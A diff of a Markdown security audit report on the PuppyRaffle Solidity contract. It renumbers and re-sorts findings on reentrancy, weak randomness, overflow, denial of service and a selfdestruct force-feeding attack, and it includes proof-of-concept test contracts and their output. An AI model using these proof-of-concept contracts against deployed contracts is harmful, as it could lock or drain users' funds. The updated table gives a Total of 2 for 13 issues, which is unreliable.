@@ -1,7 +1,7 @@
 ---
 title: Puppy Raffle Audit Report
 author: CryptoBog_xyz
-date: March 5, 2024
+date: March 15, 2024
 header-includes:
   - \usepackage{titling}
   - \usepackage{graphicx}
@@ -43,22 +43,22 @@ Lead Auditors:
   - [Issues found](#issues-found)
 - [Findings](#findings)
 - [High](#high)
-    - [\[M-1\] DoS issue in the for loop, which could lead to the break of the contract](#m-1-dos-issue-in-the-for-loop-which-could-lead-to-the-break-of-the-contract)
-    - [\[H-#\] The reset of the `PuppyRaffle::players[playerIndex]` array happens after the external call `PuppyRaffle::sendValue()` which leads to a reentancy situation.](#h--the-reset-of-the-puppyraffleplayersplayerindex-array-happens-after-the-external-call-puppyrafflesendvalue-which-leads-to-a-reentancy-situation)
-    - [\[S-#\] The randomness generator in the `PuppyRaffle::selectWinner()` is not really random and can be influenced which breaks one of the main functioalities of the protocol "4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy"](#s--the-randomness-generator-in-the-puppyraffleselectwinner-is-not-really-random-and-can-be-influenced-which-breaks-one-of-the-main-functioalities-of-the-protocol-4-every-x-seconds-the-raffle-will-be-able-to-draw-a-winner-and-be-minted-a-random-puppy)
-    - [\[S-#\] `PuppyRaffle::fee` is uint64 and can be overflown breaking the arithmetics of the protocol](#s--puppyrafflefee-is-uint64-and-can-be-overflown-breaking-the-arithmetics-of-the-protocol)
-    - [\[S-#\] Unsafe casting of uint256 to uint64 would lead to loss of fee funds, if `fee` is higher than `type(uint64).max`, which is approximately 18.45 ether.](#s--unsafe-casting-of-uint256-to-uint64-would-lead-to-loss-of-fee-funds-if-fee-is-higher-than-typeuint64max-which-is-approximately-1845-ether)
-    - [\[S-#\] The `PuppyRaffle::withdrawFees()` function is sucseptible to self-destruct attacks, which would lead to fees being stuck in the contact.](#s--the-puppyrafflewithdrawfees-function-is-sucseptible-to-self-destruct-attacks-which-would-lead-to-fees-being-stuck-in-the-contact)
-    - [\[S-#\] `Refund()` function has no impact on the length of the array which is used to calculate the `totalAmountCollected`, which could lead to manipulation and loss of funds for the contract](#s--refund-function-has-no-impact-on-the-length-of-the-array-which-is-used-to-calculate-the-totalamountcollected-which-could-lead-to-manipulation-and-loss-of-funds-for-the-contract)
-    - [\[S-#\] `Refund()` function has no impact on the length of the array, the slots of the array are still "participating in the raffle" and can win the raffle, which would lead to sending the `prizePool` to the 0-address](#s--refund-function-has-no-impact-on-the-length-of-the-array-the-slots-of-the-array-are-still-participating-in-the-raffle-and-can-win-the-raffle-which-would-lead-to-sending-the-prizepool-to-the-0-address)
-    - [\[H-#\] The randomness generator in the rarity calculation part of the `PuppyRaffle::selectWinner()` function is not really random and can be pre-calculated which breaks one of the main functionalities of the protocol](#h--the-randomness-generator-in-the-rarity-calculation-part-of-the-puppyraffleselectwinner-function-is-not-really-random-and-can-be-pre-calculated-which-breaks-one-of-the-main-functionalities-of-the-protocol)
+    - [\[H-1\] The reset of the `PuppyRaffle::players[playerIndex]` array happens after the external call `PuppyRaffle::sendValue()` which leads to a reentancy situation.](#h-1-the-reset-of-the-puppyraffleplayersplayerindex-array-happens-after-the-external-call-puppyrafflesendvalue-which-leads-to-a-reentancy-situation)
+    - [\[H-2\] The randomness generator in the `PuppyRaffle::selectWinner()` is not really random and can be influenced which breaks one of the main functioalities of the protocol "4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy"](#h-2-the-randomness-generator-in-the-puppyraffleselectwinner-is-not-really-random-and-can-be-influenced-which-breaks-one-of-the-main-functioalities-of-the-protocol-4-every-x-seconds-the-raffle-will-be-able-to-draw-a-winner-and-be-minted-a-random-puppy)
+    - [\[H-3\] `PuppyRaffle::fee` is uint64 and can be overflown breaking the arithmetics of the protocol](#h-3-puppyrafflefee-is-uint64-and-can-be-overflown-breaking-the-arithmetics-of-the-protocol)
+    - [\[H-4\] Unsafe casting of uint256 to uint64 would lead to loss of fee funds, if `fee` is higher than `type(uint64).max`, which is approximately 18.45 ether.](#h-4-unsafe-casting-of-uint256-to-uint64-would-lead-to-loss-of-fee-funds-if-fee-is-higher-than-typeuint64max-which-is-approximately-1845-ether)
+    - [\[H-5\] `Refund()` function has no impact on the length of the array which is used to calculate the `totalAmountCollected`, which could lead to manipulation and loss of funds for the contract](#h-5-refund-function-has-no-impact-on-the-length-of-the-array-which-is-used-to-calculate-the-totalamountcollected-which-could-lead-to-manipulation-and-loss-of-funds-for-the-contract)
+    - [\[H-6\] `Refund()` function has no impact on the length of the array, the slots of the array are still "participating in the raffle" and can win the raffle, which would lead to sending the `prizePool` to the 0-address](#h-6-refund-function-has-no-impact-on-the-length-of-the-array-the-slots-of-the-array-are-still-participating-in-the-raffle-and-can-win-the-raffle-which-would-lead-to-sending-the-prizepool-to-the-0-address)
+    - [\[H-7\] The randomness generator in the rarity calculation part of the `PuppyRaffle::selectWinner()` function is not really random and can be pre-calculated which breaks one of the main functionalities of the protocol](#h-7-the-randomness-generator-in-the-rarity-calculation-part-of-the-puppyraffleselectwinner-function-is-not-really-random-and-can-be-pre-calculated-which-breaks-one-of-the-main-functionalities-of-the-protocol)
 - [Medium](#medium)
+    - [\[M-1\] DoS issue in the for loop, which could lead to the break of the contract](#m-1-dos-issue-in-the-for-loop-which-could-lead-to-the-break-of-the-contract)
+    - [\[M-2\] The `PuppyRaffle::withdrawFees()` function is sucseptible to self-destruct attacks, which would lead to fees being stuck in the contact.](#m-2-the-puppyrafflewithdrawfees-function-is-sucseptible-to-self-destruct-attacks-which-would-lead-to-fees-being-stuck-in-the-contact)
 - [Low](#low)
 - [Informational](#informational)
-    - [\[I-#\] No 0-address checking during the change of `feeAddress`, which could effectively lead to blocking the ability to withdraw fees and/or loss of funds.](#i--no-0-address-checking-during-the-change-of-feeaddress-which-could-effectively-lead-to-blocking-the-ability-to-withdraw-fees-andor-loss-of-funds)
-    - [\[I-#\] `PuppyRaffle::_isActivePlayer()` is set to internal and not called anywhere, effectively being an unused code](#i--puppyraffle_isactiveplayer-is-set-to-internal-and-not-called-anywhere-effectively-being-an-unused-code)
-    - [\[I-#\] Inconsistent documentation, which could irritate potential users](#i--inconsistent-documentation-which-could-irritate-potential-users)
-    - [\[I-#\] Use of floating pragma version is not a best practice](#i--use-of-floating-pragma-version-is-not-a-best-practice)
+    - [\[I-1\] No 0-address checking during the change of `feeAddress`, which could effectively lead to blocking the ability to withdraw fees and/or loss of funds.](#i-1-no-0-address-checking-during-the-change-of-feeaddress-which-could-effectively-lead-to-blocking-the-ability-to-withdraw-fees-andor-loss-of-funds)
+    - [\[I-2\] `PuppyRaffle::_isActivePlayer()` is set to internal and not called anywhere, effectively being an unused code](#i-2-puppyraffle_isactiveplayer-is-set-to-internal-and-not-called-anywhere-effectively-being-an-unused-code)
+    - [\[I-3\] Inconsistent documentation, which could irritate potential users](#i-3-inconsistent-documentation-which-could-irritate-potential-users)
+    - [\[I-4\] Use of floating pragma version is not a best practice](#i-4-use-of-floating-pragma-version-is-not-a-best-practice)
 - [Gas](#gas)
     - [\[G-1\] `raffleDuration` variable is never changed but declared as a storage variable increasing the gas cost](#g-1-raffleduration-variable-is-never-changed-but-declared-as-a-storage-variable-increasing-the-gas-cost)
     - [\[G-2\] `commonImageUri`, `rareImageUri` \& `legendaryImageUri` variabls are never changed but declared as a storage variables increasing the gas cost](#g-2-commonimageuri-rareimageuri--legendaryimageuri-variabls-are-never-changed-but-declared-as-a-storage-variables-increasing-the-gas-cost)
@@ -108,74 +108,16 @@ Player - Participant of the raffle, has the power to enter the raffle with the `
 ## Issues found
 | Severity      | Number of Issues |
 | ------------- | ---------------- |
-| High          | 0                |
-| Medium        | 0                |
+| High          | 7                |
+| Medium        | 2                |
 | Low           | 0                |
-| Informational | 0                |
-| Total         | 0                |
+| Informational | 4                |
+| Total         | 2                |
 
 # Findings
 # High
 
-### [M-1] DoS issue in the for loop, which could lead to the break of the contract
-
-**Description:** Function `PuppyRaffle.sol::enterRaffle()` has a for-loop which checks for duplicate players and reverts if finds any. 
-The problem arises when the `PuppyRaffle.sol::players` array gets big and this could lead to a denial of service (i.e. the function `PuppyRaffle.sol::enterRaffle()` becomes unfinishable).
-
-```solidity
-function enterRaffle(address[] memory newPlayers) public payable {
-        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle"); 
-        for (uint256 i = 0; i < newPlayers.length; i++) {
-            players.push(newPlayers[i]);
-        }
-
-        // Check for duplicates
-        for (uint256 i = 0; i < players.length - 1; i++) { 
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
-        emit RaffleEnter(newPlayers);
-    }
-```
-
-**Impact:** Denial of Service could lead to the main functionality ("This project is to enter a raffle to win a cute dog NFT.") of the contract being inaccessible. 
-
-**Proof of Concept:** 
-In the test suite add the following test which proves that the gas cost of entering the raffle increases with the number of players taking part. 
-
-```solidity
-function testDoSAttack() public {
-        uint64 numPlayers = 100; // Set the number of players
-        address[] memory players = new address[](numPlayers); // Initialize an array for the players
-        for (uint128 i = 0; i < numPlayers; i++) {
-            players[i] = address(uint160(i)); // Generate unique addresses
-        }
-        uint256 gasStartFirst = gasleft(); // Record gas before the transaction
-        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players); // Enter the raffle with the first group of players
-        uint256 gasEndFirst = gasleft(); // Record gas after the transaction
-        uint256 gasCostFirst = gasStartFirst - gasEndFirst; // Calculate the gas cost of the transaction
-        console.log(gasCostFirst); // Log the gas cost
-
-        address[] memory playersTwo = new address[](numPlayers); // Initialize a second array for the players
-        for (uint128 i = 0; i < numPlayers; i++) {
-            playersTwo[i] = address(uint160(i + numPlayers)); // Generate unique addresses for the second group
-        }
-        uint256 gasStartSecond = gasleft(); // Record gas before the second transaction
-        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(playersTwo); // Enter the raffle with the second group of players
-        uint256 gasEndSecond = gasleft(); // Record gas after the second transaction
-        uint256 gasCostSecond = gasStartSecond - gasEndSecond; // Calculate the gas cost of the second transaction
-        console.log(gasCostSecond); // Log the gas cost of the second transaction
-
-        assert(gasCostSecond > gasCostFirst); // Assert that the gas cost for the second transaction is higher
-    }
-```
-
-**Recommended Mitigation:** 
-
-<hr>
-
-### [H-#] The reset of the `PuppyRaffle::players[playerIndex]` array happens after the external call `PuppyRaffle::sendValue()` which leads to a reentancy situation.
+### [H-1] The reset of the `PuppyRaffle::players[playerIndex]` array happens after the external call `PuppyRaffle::sendValue()` which leads to a reentancy situation.
 
 **Description:** In the function `PuppyRaffle::refund()` the array which stores the active users (i.e. those who have not yet refunded their `PuppyRaffle::entranceFee`) is updated after the external call `PuppyRaffle::sendValue()`. In that case a user might implement a malicious contract that would reenter the `PuppyRaffle::refund()` after receiving the entrance fee and clear out the contract's balance.
 
@@ -282,7 +224,7 @@ function testCanReenter() public playerEntered {
 
 <hr>
 
-### [S-#] The randomness generator in the `PuppyRaffle::selectWinner()` is not really random and can be influenced which breaks one of the main functioalities of the protocol "4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy"
+### [H-2] The randomness generator in the `PuppyRaffle::selectWinner()` is not really random and can be influenced which breaks one of the main functioalities of the protocol "4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy"
 
 **Description:** The `PuppyRaffle::selectWinner()` function's reliance on `msg.sender`, `block.timestamp`, `and block.difficulty` for determining the winner introduces vulnerabilities to manipulation by users or miners. Its external visibility allows any address to potentially influence the outcome, compromising the randomness of the selection process.
 
@@ -321,7 +263,7 @@ A Commit-Reveal Scheme involves participants committing to a secret value (their
 
 For more information on Commit-Reveal Schemes, you can refer to academic papers and articles on the topic, such as this [paper](https://eprint.iacr.org/2015/1090.pdfk) on the subject.
 
-### [S-#] `PuppyRaffle::fee` is uint64 and can be overflown breaking the arithmetics of the protocol
+### [H-3] `PuppyRaffle::fee` is uint64 and can be overflown breaking the arithmetics of the protocol
 
 **Description:** In the `PuppyRaffle::selectWinner()` the fee can be overflown if it rises above the level of max(uint64), which is equal to "18446744073709551615". 
 
@@ -417,7 +359,7 @@ The expected amount of totalFees is higher than the real amount.
 ```
 
 
-### [S-#] Unsafe casting of uint256 to uint64 would lead to loss of fee funds, if `fee` is higher than `type(uint64).max`, which is approximately 18.45 ether.
+### [H-4] Unsafe casting of uint256 to uint64 would lead to loss of fee funds, if `fee` is higher than `type(uint64).max`, which is approximately 18.45 ether.
 
 **Description:** The `PuppyRaffle::fee` variable is initially defined as uint256, but then downcasted to uint64. Downcasting leads to concatenation of the variable, which in the case of uint would mean loss of fee funds.
 
@@ -521,116 +463,10 @@ Output:
 
 
 
-### [S-#] The `PuppyRaffle::withdrawFees()` function is sucseptible to self-destruct attacks, which would lead to fees being stuck in the contact.
-
-**Description:** The `PuppyRaffle::withdrawFees()` function does the require check as the first step:
-
-```solidity
-    function withdrawFees() external {
-@-->    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!"); 
-```
-
-The issue hides in the following: contracts can receive funds by 3 means: 
-1. through `receive()`function - not an issue, as there is no `receive()` function
-2. through `fallback()`function - not an issue, as there is no `fallback()` function
-3. when another contract self-destructs - issue.
-
-**Impact:** If the require statement fails, the `PuppyRaffle::withdrawFees()` function could never be called, leading to breaking the functionality of the contract and losing all the future fees.
-
-**Proof of Concept:** Anyone could forcefully push funds to the contract through self-destruct by creating a contract and calling the destroy method on it. The following test shows the way of accomplishing this.
-
-1. Create an attacker contract:
-```solidity
-    contract selfDestruct {
-        
-        PuppyRaffle puppyRaffle;
-        constructor(PuppyRaffle _puppyRaffle) {
-            puppyRaffle = _puppyRaffle;
-        }
-
-        function destroy() public {
-            selfdestruct(payable(address(puppyRaffle)));
-        }
-    }
-```
-
-2. Create a test:
-```solidity
-    modifier playersEntered() {
-        address[] memory players = new address[](4);
-        players[0] = playerOne;
-        players[1] = playerTwo;
-        players[2] = playerThree;
-        players[3] = playerFour;
-        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
-        _;
-    }
-
-    function testCanBreakWithdrawFees() public playersEntered {
-// DONE - 1. enterRaffle with entranceFee with the help of modifier playersEntered
-
-// DONE - 2. console.log(address(this).balance) before pushing through self-destruct
-        console.log(address(puppyRaffle).balance, "= Balance of PuppyRaffle contract before attack");
-
-// DONE - 3. Create an attackerContract instance and load with funds
-        selfDestruct attackerContract = new selfDestruct(puppyRaffle);
-        vm.deal(address(attackerContract), 10 ether);
-        console.log(address(attackerContract).balance, "= Balance of Attacker contract");
-        
-// DONE - 4. Push funds through self-destruct to the address(PuppyRaffle)
-        vm.prank(playerOne);
-        attackerContract.destroy();
-
-// 5. Test selectWinner(), so that totalFees != 0
-        vm.warp(block.timestamp + duration + 1);
-        vm.roll(block.number + 1);
-        puppyRaffle.selectWinner();
-
-// DONE - 5. console.log(address(this).balance)
-        console.log(address(puppyRaffle).balance, "= Balance of PuppyRaffle contract after attack");
-        console.log(puppyRaffle.totalFees(), "= PuppyRaffle totalFees currently");
-        
-// DONE - 6. create a check for the next call to revert  
-        vm.expectRevert("PuppyRaffle: There are currently players active!");
-        vm.prank(playerOne);
-
-// DONE - 7. call puppyRaffle.withdrawFees()
-        puppyRaffle.withdrawFees();
-    }
-}
-```
-
-3. Check the output:
-```bash
-    Ran 1 test for test/Audit_PoC_Selfdestruct.t.sol:Audit_PoC_Selfdestruct
-    [PASS] testCanBreakWithdrawFees() (gas: 360042)
-    Logs:
-    4000000000000000000 = Balance of PuppyRaffle contract before attack
-    10000000000000000000 = Balance of Attacker contract
-@-->10800000000000000000 = Balance of PuppyRaffle contract after attack
-@-->800000000000000000 = PuppyRaffle totalFees currently
-
-    Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.80ms (1.23ms CPU time)
-```
-
-As you can see the `address(this).balance` is not equal to the `PuppyRaffle::totalFees()`, thus the `PuppyRidge::withdrawFees()` function would revert during the first require check.
-
-**Recommended Mitigation:** 
-Remove the first require statement from the `PuppyRidge::withdrawFees()` function. 
-
-```diff
-        function withdrawFees() external {
--           require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!"); 
-            uint256 feesToWithdraw = totalFees;
-            totalFees = 0;
-            (bool success,) = feeAddress.call{value: feesToWithdraw}("");
-            require(success, "PuppyRaffle: Failed to withdraw fees");
-        }
-```
 
 
 
-### [S-#] `Refund()` function has no impact on the length of the array which is used to calculate the `totalAmountCollected`, which could lead to manipulation and loss of funds for the contract
+### [H-5] `Refund()` function has no impact on the length of the array which is used to calculate the `totalAmountCollected`, which could lead to manipulation and loss of funds for the contract
 
 **Description:** In the `PuppyRaffle::selectWinner()` function `totalAmountCollected` is calculated by multiplying the length of the `players` array by the entranceFee. The problem is that the length of the `players` array stays the same even if one or many players have refunded their `entranceFee`s. This leads to incorrect calculation of the total amount of funds in the current Raffle. 
 
@@ -741,7 +577,7 @@ To address the issue of the `refund()` function not impacting the length of the 
 
 2. Use a Mapping: Instead of using an array to track players, use a mapping to keep track of active players. This way, you can easily remove players from the mapping when they refund.
 
-### [S-#] `Refund()` function has no impact on the length of the array, the slots of the array are still "participating in the raffle" and can win the raffle, which would lead to sending the `prizePool` to the 0-address
+### [H-6] `Refund()` function has no impact on the length of the array, the slots of the array are still "participating in the raffle" and can win the raffle, which would lead to sending the `prizePool` to the 0-address
 
 **Description:** The `Refund()` function does not update the array fully. The index of the player who has called `refund()` can still win. 
 
@@ -752,7 +588,7 @@ To address the issue of the `refund()` function not impacting the length of the 
 **Recommended Mitigation:** See the aforementioned `Refund()` issue.
 
 
-### [H-#] The randomness generator in the rarity calculation part of the `PuppyRaffle::selectWinner()` function is not really random and can be pre-calculated which breaks one of the main functionalities of the protocol
+### [H-7] The randomness generator in the rarity calculation part of the `PuppyRaffle::selectWinner()` function is not really random and can be pre-calculated which breaks one of the main functionalities of the protocol
 
 
 **Description:** The randomness generator in the `PuppyRaffle::selectWinner()` function relies on the `msg.sender` address and the `block.difficulty` parameter. However, neither of these sources is inherently random. A user could potentially precalculate the address that would result in a rare item, and the use of `block.difficulty` for randomness generation is not recommended.
@@ -781,10 +617,174 @@ The use of `msg.sender` and `block.difficulty` for randomness generation in the 
 See the aforementioned issue with PRNG.
 
 # Medium
+### [M-1] DoS issue in the for loop, which could lead to the break of the contract
+
+**Description:** Function `PuppyRaffle.sol::enterRaffle()` has a for-loop which checks for duplicate players and reverts if finds any. 
+The problem arises when the `PuppyRaffle.sol::players` array gets big and this could lead to a denial of service (i.e. the function `PuppyRaffle.sol::enterRaffle()` becomes unfinishable).
+
+```solidity
+function enterRaffle(address[] memory newPlayers) public payable {
+        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle"); 
+        for (uint256 i = 0; i < newPlayers.length; i++) {
+            players.push(newPlayers[i]);
+        }
+
+        // Check for duplicates
+        for (uint256 i = 0; i < players.length - 1; i++) { 
+            for (uint256 j = i + 1; j < players.length; j++) {
+                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
+            }
+        }
+        emit RaffleEnter(newPlayers);
+    }
+```
+
+**Impact:** Denial of Service could lead to the main functionality ("This project is to enter a raffle to win a cute dog NFT.") of the contract being inaccessible. 
+
+**Proof of Concept:** 
+In the test suite add the following test which proves that the gas cost of entering the raffle increases with the number of players taking part. 
+
+```solidity
+function testDoSAttack() public {
+        uint64 numPlayers = 100; // Set the number of players
+        address[] memory players = new address[](numPlayers); // Initialize an array for the players
+        for (uint128 i = 0; i < numPlayers; i++) {
+            players[i] = address(uint160(i)); // Generate unique addresses
+        }
+        uint256 gasStartFirst = gasleft(); // Record gas before the transaction
+        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players); // Enter the raffle with the first group of players
+        uint256 gasEndFirst = gasleft(); // Record gas after the transaction
+        uint256 gasCostFirst = gasStartFirst - gasEndFirst; // Calculate the gas cost of the transaction
+        console.log(gasCostFirst); // Log the gas cost
+
+        address[] memory playersTwo = new address[](numPlayers); // Initialize a second array for the players
+        for (uint128 i = 0; i < numPlayers; i++) {
+            playersTwo[i] = address(uint160(i + numPlayers)); // Generate unique addresses for the second group
+        }
+        uint256 gasStartSecond = gasleft(); // Record gas before the second transaction
+        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(playersTwo); // Enter the raffle with the second group of players
+        uint256 gasEndSecond = gasleft(); // Record gas after the second transaction
+        uint256 gasCostSecond = gasStartSecond - gasEndSecond; // Calculate the gas cost of the second transaction
+        console.log(gasCostSecond); // Log the gas cost of the second transaction
+
+        assert(gasCostSecond > gasCostFirst); // Assert that the gas cost for the second transaction is higher
+    }
+```
+
+**Recommended Mitigation:** 
+
+
+### [M-2] The `PuppyRaffle::withdrawFees()` function is sucseptible to self-destruct attacks, which would lead to fees being stuck in the contact.
+
+**Description:** The `PuppyRaffle::withdrawFees()` function does the require check as the first step:
+
+```solidity
+    function withdrawFees() external {
+@-->    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!"); 
+```
+
+The issue hides in the following: contracts can receive funds by 3 means: 
+1. through `receive()`function - not an issue, as there is no `receive()` function
+2. through `fallback()`function - not an issue, as there is no `fallback()` function
+3. when another contract self-destructs - issue.
+
+**Impact:** If the require statement fails, the `PuppyRaffle::withdrawFees()` function could never be called, leading to breaking the functionality of the contract and losing all the future fees.
+
+**Proof of Concept:** Anyone could forcefully push funds to the contract through self-destruct by creating a contract and calling the destroy method on it. The following test shows the way of accomplishing this.
+
+1. Create an attacker contract:
+```solidity
+    contract selfDestruct {
+        
+        PuppyRaffle puppyRaffle;
+        constructor(PuppyRaffle _puppyRaffle) {
+            puppyRaffle = _puppyRaffle;
+        }
+
+        function destroy() public {
+            selfdestruct(payable(address(puppyRaffle)));
+        }
+    }
+```
+
+2. Create a test:
+```solidity
+    modifier playersEntered() {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+        _;
+    }
+
+    function testCanBreakWithdrawFees() public playersEntered {
+// DONE - 1. enterRaffle with entranceFee with the help of modifier playersEntered
+
+// DONE - 2. console.log(address(this).balance) before pushing through self-destruct
+        console.log(address(puppyRaffle).balance, "= Balance of PuppyRaffle contract before attack");
+
+// DONE - 3. Create an attackerContract instance and load with funds
+        selfDestruct attackerContract = new selfDestruct(puppyRaffle);
+        vm.deal(address(attackerContract), 10 ether);
+        console.log(address(attackerContract).balance, "= Balance of Attacker contract");
+        
+// DONE - 4. Push funds through self-destruct to the address(PuppyRaffle)
+        vm.prank(playerOne);
+        attackerContract.destroy();
+
+// 5. Test selectWinner(), so that totalFees != 0
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+
+// DONE - 5. console.log(address(this).balance)
+        console.log(address(puppyRaffle).balance, "= Balance of PuppyRaffle contract after attack");
+        console.log(puppyRaffle.totalFees(), "= PuppyRaffle totalFees currently");
+        
+// DONE - 6. create a check for the next call to revert  
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        vm.prank(playerOne);
+
+// DONE - 7. call puppyRaffle.withdrawFees()
+        puppyRaffle.withdrawFees();
+    }
+}
+```
+
+3. Check the output:
+```bash
+    Ran 1 test for test/Audit_PoC_Selfdestruct.t.sol:Audit_PoC_Selfdestruct
+    [PASS] testCanBreakWithdrawFees() (gas: 360042)
+    Logs:
+    4000000000000000000 = Balance of PuppyRaffle contract before attack
+    10000000000000000000 = Balance of Attacker contract
+@-->10800000000000000000 = Balance of PuppyRaffle contract after attack
+@-->800000000000000000 = PuppyRaffle totalFees currently
+
+    Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.80ms (1.23ms CPU time)
+```
+
+As you can see the `address(this).balance` is not equal to the `PuppyRaffle::totalFees()`, thus the `PuppyRidge::withdrawFees()` function would revert during the first require check.
+
+**Recommended Mitigation:** 
+Remove the first require statement from the `PuppyRidge::withdrawFees()` function. 
+
+```diff
+        function withdrawFees() external {
+-           require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!"); 
+            uint256 feesToWithdraw = totalFees;
+            totalFees = 0;
+            (bool success,) = feeAddress.call{value: feesToWithdraw}("");
+            require(success, "PuppyRaffle: Failed to withdraw fees");
+        }
+```
+
 # Low 
 # Informational
 
-### [I-#] No 0-address checking during the change of `feeAddress`, which could effectively lead to blocking the ability to withdraw fees and/or loss of funds.
+### [I-1] No 0-address checking during the change of `feeAddress`, which could effectively lead to blocking the ability to withdraw fees and/or loss of funds.
 
 **Description:** The `changeFeeAddress()` function does no sanity checks on the input parameters. 
 
@@ -810,7 +810,7 @@ See the aforementioned issue with PRNG.
 ```
 
 
-### [I-#] `PuppyRaffle::_isActivePlayer()` is set to internal and not called anywhere, effectively being an unused code
+### [I-2] `PuppyRaffle::_isActivePlayer()` is set to internal and not called anywhere, effectively being an unused code
 
 **Description:** The `_isActivePlayer()` function's visibility is set to internal and not called anywhere. This function does not bring any value
 
@@ -822,7 +822,7 @@ See the aforementioned issue with PRNG.
 
 
 
-### [I-#] Inconsistent documentation, which could irritate potential users
+### [I-3] Inconsistent documentation, which could irritate potential users
 
 **Description:** The documentation first states that one can enter himself "multiple times", but the next point tells the user, that duplicate addresses are not allowed. The latter is also consistent with the checks in the code.
 
@@ -841,7 +841,7 @@ See the aforementioned issue with PRNG.
 
 
 
-### [I-#] Use of floating pragma version is not a best practice
+### [I-4] Use of floating pragma version is not a best practice
 
 **Description:** The contract uses `pragma solidity ^0.7.6;`.
 
